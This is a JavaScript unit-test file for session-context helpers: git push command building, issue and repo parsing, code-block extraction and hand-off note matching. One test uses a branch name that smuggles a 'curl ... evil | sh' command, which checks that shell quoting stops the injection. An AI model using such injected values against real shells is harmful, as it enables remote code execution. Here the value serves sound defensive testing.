import assert from 'node:assert/strict';
import test from 'node:test';

import {
  buildPushCommand,
  extractCodeBlocks,
  isCheckoutNoteFile,
  matchesCheckoutDoc,
  parseGitHubRepo,
  parseIssueNumber,
} from '../session-context.helpers.js';

test('buildPushCommand sets the upstream when the branch has none', () => {
  assert.equal(
    buildPushCommand({ folderPath: 'C:\\workspaces\\Ocuvera-884-turningPrompt', branch: '884-turningPrompt', hasUpstream: false, remoteName: 'origin' }),
    'git -C C:\\workspaces\\Ocuvera-884-turningPrompt push -u origin 884-turningPrompt',
  );
});

test('buildPushCommand is a plain push when the upstream exists', () => {
  assert.equal(
    buildPushCommand({ folderPath: '/repo', branch: 'main', hasUpstream: true, remoteName: 'origin' }),
    'git -C /repo push',
  );
});

test('buildPushCommand quotes a folder with spaces and gives nothing on a detached HEAD', () => {
  assert.equal(
    buildPushCommand({ folderPath: 'C:\\My Repos\\app', branch: 'x', hasUpstream: true, remoteName: 'origin' }),
    "git -C 'C:\\My Repos\\app' push",
  );
  assert.equal(buildPushCommand({ folderPath: '/repo', branch: null, hasUpstream: false, remoteName: 'origin' }), null);
});

test('buildPushCommand single-quotes a branch with shell characters and refuses an embedded quote', () => {
  assert.equal(
    buildPushCommand({ folderPath: '/repo', branch: 'x;curl${IFS}evil|sh', hasUpstream: false, remoteName: 'origin' }),
    "git -C /repo push -u origin 'x;curl${IFS}evil|sh'",
  );
  assert.equal(buildPushCommand({ folderPath: '/repo', branch: "it's", hasUpstream: false, remoteName: 'origin' }), null);
});

test('parseIssueNumber reads the branch first, then the folder name', () => {
  assert.equal(parseIssueNumber('wintaru/696-stirring-sensitivity-warning', '/w/x'), 696);
  assert.equal(parseIssueNumber('805-startPatientScreenShows', '/w/x'), 805);
  assert.equal(parseIssueNumber('wintaru/split-view', 'C:\\workspaces\\Ocuvera-882-amqpWebSocketsSpike'), 882);
  assert.equal(parseIssueNumber('wintaru/split-view', 'C:\\workspaces\\claudecodeui'), null);
  assert.equal(parseIssueNumber(null, '/w/Ocuvera'), null);
});

test('parseGitHubRepo reads HTTPS and SSH remotes', () => {
  assert.deepEqual(parseGitHubRepo('https://github.com/Ocuvera/Ocuvera.git'), { owner: 'Ocuvera', name: 'Ocuvera' });
  assert.deepEqual(parseGitHubRepo('git@github.com:Wintaru/claudecodeui.git\n'), { owner: 'Wintaru', name: 'claudecodeui' });
  assert.deepEqual(parseGitHubRepo('https://github.com/a/b'), { owner: 'a', name: 'b' });
  assert.equal(parseGitHubRepo('https://dev.azure.com/org/project/_git/repo'), null);
});

test('extractCodeBlocks keeps every fenced block except diagrams, in order', () => {
  const reply = [
    'Run these:',
    '```powershell',
    'ov-dbup -Target Org',
    '```',
    '```mermaid',
    'flowchart LR',
    '```',
    '````markdown',
    '```js',
    'inner();',
    '```',
    '````',
    '```',
    'fix: a subject',
    '```',
  ].join('\n');
  assert.deepEqual(extractCodeBlocks(reply), [
    { language: 'powershell', code: 'ov-dbup -Target Org' },
    { language: 'markdown', code: '```js\ninner();\n```' },
    { language: null, code: 'fix: a subject' },
  ]);
});

test('extractCodeBlocks ignores an unclosed fence and empty blocks', () => {
  assert.deepEqual(extractCodeBlocks('```bash\n\n```\n```sh\nnot closed'), []);
});

test('isCheckoutNoteFile matches the hand-off note names', () => {
  assert.equal(isCheckoutNoteFile('882-HANDOFF.md'), true);
  assert.equal(isCheckoutNoteFile('PWM-DIMMING-BENCH-CHECKLIST.md'), true);
  assert.equal(isCheckoutNoteFile('README.md'), false);
  assert.equal(isCheckoutNoteFile('DECISIONS.md'), false);
});

test('matchesCheckoutDoc matches by repo and issue, or by branch slug without an issue', () => {
  const ocuvera = { repoName: 'Ocuvera', issueNumber: 884, branchSlug: 'turningPrompt' };
  assert.equal(matchesCheckoutDoc('Ocuvera-884-patient-position-manager-DESIGN.md', ocuvera), true);
  assert.equal(matchesCheckoutDoc('Ocuvera-8840-other-DESIGN.md', ocuvera), false);
  assert.equal(matchesCheckoutDoc('WorkDashboard-884-x-DESIGN.md', ocuvera), false);

  const fork = { repoName: 'claudecodeui', issueNumber: null, branchSlug: 'split-view' };
  assert.equal(matchesCheckoutDoc('claudecodeui-1-split-view-DESIGN.md', fork), true);
  assert.equal(matchesCheckoutDoc('claudecodeui-session-context-panel-DESIGN.md', fork), false);

  const walkthrough = { repoName: null, issueNumber: 877, branchSlug: null };
  assert.equal(matchesCheckoutDoc('877-reviewEventManager-WALKTHROUGH.md', walkthrough), true);
  assert.equal(matchesCheckoutDoc('877-reviewEventManager-WALKTHROUGH-assets', walkthrough), false);
});
